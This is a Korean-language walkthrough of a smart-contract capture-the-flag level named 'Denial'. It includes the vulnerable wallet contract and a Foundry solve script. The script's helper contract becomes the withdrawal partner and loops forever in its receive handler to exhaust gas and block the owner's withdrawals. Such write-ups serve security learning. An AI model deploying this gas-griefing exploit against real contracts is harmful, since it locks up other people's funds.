# 지문

이것은 일정 시간에 걸쳐 자금을 조금씩 흘려주는(drip) 간단한 지갑입니다.
출금 파트너(withdrawing partner)가 되면 자금을 천천히 출금할 수 있습니다.

만약 컨트랙트에 여전히 자금이 남아 있고 트랜잭션이 100만 가스 이하일 때, 소유자가 `withdraw()`를 호출해도 출금을 막을 수 있다면 이 레벨에서 승리하게 됩니다.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

# 풀이 

만약 컨트랙트에 여전히 자금이 남아 있고 트랜잭션이 100만 가스 이하일 때, 소유자가 `withdraw()`를 호출해도 출금을 막을 수 있다면 이 레벨에서 승리하게 됩니다.

^ 이것이 문제의 풀이 조건인데 그냥 partner가 된 이후에 receive handler에서 gas를 다 소모시켜서 그 뒤의 코드가 실행되지않도록 만들면됨.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function setWithdrawPartner(address _partner) external;
    function contractBalance() external view returns (uint256);
    function withdraw() external;
    function partner() external view returns (address);
}

contract Helper {

    function trigger(address target) public {
        ITarget(target).setWithdrawPartner(address(this));
    }
    receive() external payable {
        uint256 a = 0;
        while(true){
            a+=1;
            a-=1;
        }
    }
}
contract SolveScript is Script {
    address public target = 0xe73bc5BD4763A3307AB5F8F126634b7E12E3dA9b;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        Helper helper = new Helper();
        helper.trigger(target);
        console.log("helper address : %s", address(helper));
        console.log("target partner : %s", ITarget(target).partner());
        vm.stopBroadcast();
    }
}
```